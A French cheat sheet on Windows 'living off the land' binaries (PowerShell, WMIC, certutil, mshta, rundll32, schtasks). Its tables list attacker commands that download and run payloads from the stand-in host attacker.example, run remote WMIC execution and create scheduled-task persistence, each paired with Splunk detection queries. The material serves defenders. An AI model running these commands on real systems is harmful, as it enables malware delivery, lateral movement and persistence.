---
title: "LOLBins Windows — usages détournés et détection"
description: "Les outils intégrés à Windows que les attaquants détournent (PowerShell, WMIC, certutil, mshta, rundll32, schtasks) : commandes typiques et requêtes Splunk pour les repérer."
tags: [windows, lolbins, powershell, splunk, sysmon]
updated: 2026-11-23
draft: false
type: cheatsheet
tool: Windows
---

*Living off the Land* : l'attaquant utilise les outils déjà présents et signés sur la machine plutôt que les siens. Ils sont de confiance, autorisés par défaut, et leur usage ressemble à de l'administration : moins d'alertes, pas de nouveau binaire sur le disque. Ils couvrent les besoins habituels d'une attaque : exécution, persistance, reconnaissance, déplacement latéral. Les outils Sysinternals signés (PsExec pour l'exécution à distance, Autoruns pour la persistance) sont détournés de la même façon.

Catalogues de référence : **LOLBAS** pour Windows, **GTFOBins** pour Unix et Linux. Pour détecter, il faut la ligne de commande complète et l'arbre des processus : c'est l'usage anormal d'un binaire normalement inoffensif qui alerte.

## PowerShell

Scripts en mémoire sans fichier, téléchargements, automatisation, contournement de certaines politiques d'exécution.

| Commande | Ce qu'elle fait |
| --- | --- |
| `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"` | Télécharge un script et l'exécute aussitôt en mémoire (`IEX` + `DownloadString`), sans rien écrire sur le disque. |
| `powershell -NoP -NonI -W Hidden -EncodedCommand SQBn...Base64...` | Cache la commande en Base64 : un humain ou un filtre simple ne voit pas l'intention. |
| `powershell -NoP -NonI -Command "Invoke-WebRequest 'http://attacker.example/file.exe' -OutFile 'C:\Users\Public\updater.exe'; Start-Process 'C:\Users\Public\updater.exe'"` | Télécharge un exécutable puis le lance. |

```spl title="PowerShell : téléchargement, exécution en mémoire, commande encodée"
index=wineventlog OR index=sysmon (EventCode=4688 OR EventCode=1 OR EventCode=4104)
(CommandLine="*powershell*IEX*" OR CommandLine="*powershell*-EncodedCommand*" OR CommandLine="*powershell*-Exec Bypass*" OR CommandLine="*Invoke-WebRequest*" OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-RestMethod*")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

## WMIC

Exécuter des commandes ou créer des processus en local ou à distance, interroger un système, persister. Ressemble à de l'administration, souvent autorisé.

| Commande | Ce qu'elle fait |
| --- | --- |
| `wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"` | Crée sur une machine distante un processus PowerShell qui télécharge et exécute un script : WMIC sert de lanceur à distance. |
| `wmic /node:TARGETHOST process get name,commandline` | Liste les processus et lignes de commande d'une machine distante : reconnaissance. |
| `wmic process call create "notepad.exe" /hidden` | Crée un processus local en tentant de le rendre moins visible. |

```spl title="WMIC : création de processus, reconnaissance"
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688)
(CommandLine="*\\wmic.exe*process call create*" OR CommandLine="*wmic /node:* process call create*" OR CommandLine="*wmic*process get Name,CommandLine*")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

## Certutil

Prévu pour gérer les certificats ; sait aussi télécharger et encoder ou décoder en Base64. Signé par Microsoft, il dépose des fichiers sans curl et passe certains blocages simples.

| Commande | Ce qu'elle fait |
| --- | --- |
| `certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe` | Télécharge un fichier et l'écrit sur le disque. |
| `certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe` | Reconstruit un exécutable transporté sous forme de texte Base64. |
| `certutil -encode C:\Users\Public\payload.exe C:\Users\Public\payload.b64` | Encode un exécutable en Base64 pour le masquer pendant le transfert. |

```spl title="certutil : téléchargement, encodage, décodage"
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688 OR EventCode=4663)
(Image="*\\certutil.exe" OR CommandLine="*certutil*")
(CommandLine="* -urlcache * -f *" OR CommandLine="* -decode *" OR CommandLine="* -encode *")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

## Mshta

Exécute des applications HTML (HTA), qui contiennent du VBScript ou du JavaScript.

| Commande | Ce qu'elle fait |
| --- | --- |
| `mshta "http://attacker.example/payload.hta"` | Charge un HTA depuis un serveur distant et l'exécute. |
| `mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command "Start-Process calc.exe"');close();"` | Script en ligne qui lance PowerShell, sans fichier intermédiaire. |
| `mshta "C:\Users\Public\malicious.hta"` | Exécute un HTA local, reçu en pièce jointe ou déposé sur un partage. |

```spl title="mshta : HTA distant, script en ligne, fichier .hta"
index=sysmon (EventCode=1 OR EventCode=4688) Image="*\\mshta.exe" (CommandLine="*http*://*" OR CommandLine="*javascript:*" OR CommandLine="*.hta")
| stats count by host, user, ParentImage, CommandLine
```

## Rundll32

Exécute une fonction exportée d'une DLL.

| Commande | Ce qu'elle fait |
| --- | --- |
| `rundll32.exe C:\Users\Public\backdoor.dll,Start` | Charge une DLL et appelle sa fonction `Start`. |
| `rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"` | Fait traiter une URL distante par le gestionnaire du système, qui peut amorcer la suite. |
| `rundll32.exe C:\Windows\Temp\loader.dll,Run` | Appelle une fonction d'une DLL déposée dans un dossier accessible en écriture : chargeur ou shellcode. |

```spl title="rundll32 : DLL dans un dossier inscriptible, URL distante"
index=sysmon (EventCode=1 OR EventCode=4688 OR EventCode=7) Image="*\\rundll32.exe" (CommandLine="*\\Users\\Public\\*" OR CommandLine="*url.dll,FileProtocolHandler*" OR CommandLine="*\\Windows\\Temp\\*")
| stats count by host, user, ParentImage, CommandLine
```

## Tâches planifiées (schtasks)

Persistance au démarrage, à la connexion ou à intervalle régulier, ou relance d'une charge après nettoyage. Noms qui paraissent anodins : `WindowsUpdate`, `Maintenance`. Voir la fiche [Tâche planifiée](../03-menaces-detection/persistence/tache-planifiee.md).

| Commande | Ce qu'elle fait |
| --- | --- |
| `schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')\""` | À chaque connexion, PowerShell télécharge et exécute un script distant. |
| `schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05` | Lance un script local chaque jour à 00:05 : chiffrement ou collecte répétés. |
| `schtasks /Run /TN "WindowsUpdate"` | Lance la tâche immédiatement. |

```spl title="schtasks : création et lancement de tâches"
index=wineventlog EventCode=4698 OR EventCode=4699 OR index=sysmon (EventCode=1 OR EventCode=4688) (CommandLine="*schtasks* /Create*" OR CommandLine="*schtasks* /Run*" OR Image="*\\taskeng.exe" OR EventCode=4698)
| stats count by host, user, EventCode, TaskName, CommandLine
```

## Groupes connus

| Groupe | Outils | Usage |
| --- | --- | --- |
| APT29 (Nobelium) | PowerShell, WMI | Abonnement à un événement WMI (:attack[T1546.003]) qui lit, déchiffre et exécute une charge PowerShell stockée dans WMI : persistance presque sans trace sur le disque. |
| BlackCat (ALPHV) | PowerShell, PsExec, certutil | PowerShell pour les scripts et désactiver les défenses, PsExec pour l'exécution à distance et le déplacement latéral, certutil pour récupérer ou décoder les charges. |
| QakBot, IcedID | rundll32, mshta | Chargeurs qui déposent des balises Cobalt Strike en les lançant en mémoire par des binaires Windows signés. |

## Réduire la surface d'attaque

- Défenses en couches : poste, réseau, identités.
- Contrôle des applications (AppLocker, Windows Defender Application Control) : quels scripts et exécutables ont le droit de tourner.
- Moindre privilège : seuls les administrateurs accèdent aux outils de gestion du système.
- Règles réseau et filtres DNS contre les domaines et IP malveillants connus.
- Playbooks de confinement : isoler une machine, révoquer les identifiants exposés.
- Revoir régulièrement droits, couverture des journaux et listes de contrôle.
